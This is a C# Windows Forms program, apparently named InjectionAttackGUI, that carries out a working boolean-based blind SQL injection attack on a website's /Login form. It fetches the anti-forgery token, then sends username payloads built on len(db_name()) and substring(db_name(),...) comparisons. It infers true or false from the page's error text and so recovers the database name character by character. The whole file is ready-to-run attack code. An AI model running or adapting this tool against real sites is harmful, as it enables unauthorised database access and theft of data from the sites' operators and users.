using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace InjectionAttackGUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            lblResult.Text = "";
        }

        private async void cmdGO_Click(object sender, EventArgs e)
        {
            string url = txtURL.Text;

            var cookies = new CookieContainer();
            var handler = new HttpClientHandler
            {
                CookieContainer = cookies,
                UseCookies = true,
                UseDefaultCredentials = false
            };

            var httpClient = new HttpClient(handler);
            httpClient.BaseAddress = new Uri(url);


            var token = await GetTokens(httpClient);

            // First try and work out the length
            bool solved = false;
            int length = 1;
            while (!solved)
            {
                this.lblResult.Text = "".PadLeft(length, '_');
                this.Refresh();

                string attack = "' or len(db_name()) = " + length + "--";
                if (await TryString(attack, httpClient, token))
                    solved = true;
                else
                    length++;
            }


            // Now try and solve each letter in turn
            string solution = string.Empty;
            var toTry = "0123456789abcdefghijklmnopqrstuvwxyz";
            for (int i = 0; i < length; i++)
            {
                token = await GetTokens(httpClient);

                foreach (var letterToTry in toTry)
                {

                    int letterToTryAsASCII = (int)letterToTry;
                    this.lblResult.Text = (solution + letterToTry).PadRight(length, '_');
                    this.Refresh();

                    var attack = "' or substring(db_name()," + (i + 1) + ",1) = char(" + letterToTryAsASCII + ")--";


                    if (await TryString(attack, httpClient, token))
                    {
                        solution = solution + letterToTry;
                        break;
                    }
                }
            }
        }

        private async Task<string> GetTokens(HttpClient httpClient)
        {
            var response = await httpClient.GetAsync("/Login");
            response.EnsureSuccessStatusCode();

            var html = await response.Content.ReadAsStringAsync();

            var start = html.IndexOf("__RequestVerificationToken");
            var value = html.IndexOf(@"value=""", start) + @"value=""".Length;
            var end = html.IndexOf(@"""", value + 2);
            var token = html.Substring(value, end - value);

            return token;

        }

        private async Task<bool> TryString(string stringToTry, HttpClient httpClient, string token)
        {

            var nvc = new List<KeyValuePair<string, string>>();
            nvc.Add(new KeyValuePair<string, string>("UserName", stringToTry));
            nvc.Add(new KeyValuePair<string, string>("Password", "a"));
            nvc.Add(new KeyValuePair<string, string>("RememberMe", "false"));
            nvc.Add(new KeyValuePair<string, string>("__RequestVerificationToken", token));

            var req = new HttpRequestMessage(HttpMethod.Post, "/Login?Handler=login") { Content = new FormUrlEncodedContent(nvc) };

            var response = await httpClient.SendAsync(req);
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();

                return !content.Contains("Either your");
            }
            else
            {
                return false;
            }

        }
    }
}
